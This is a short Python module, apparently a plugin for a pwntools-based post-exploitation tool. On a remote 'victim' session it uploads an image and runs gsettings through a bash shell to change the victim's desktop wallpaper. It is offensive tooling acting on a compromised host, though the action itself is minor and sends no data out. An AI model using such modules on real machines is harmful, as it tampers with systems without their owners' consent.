#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):
    if params == None:
        print(cs.status, "Usage: wallpaper [image location]")
        return 1

    try:
        if "no" in str(session.which("gsettings"), "UTF-8"):
            print(cs.error, "Victim does not have dependency: gsettings")
            return 2

        session.upload_file(params, "/tmp/wallpaper")

        shell = session.shell("/bin/bash")
        shell.sendline("(gsettings set org.gnome.desktop.background picture-uri file:///tmp/wallpaper) || echo payloadfailed")
        if "payloadfailed" not in str(shell.recvrepeat(0.2), "UTF-8"):
            shell.close()
            return 0
        else:
            pass
    except:
        return 2

    return 2
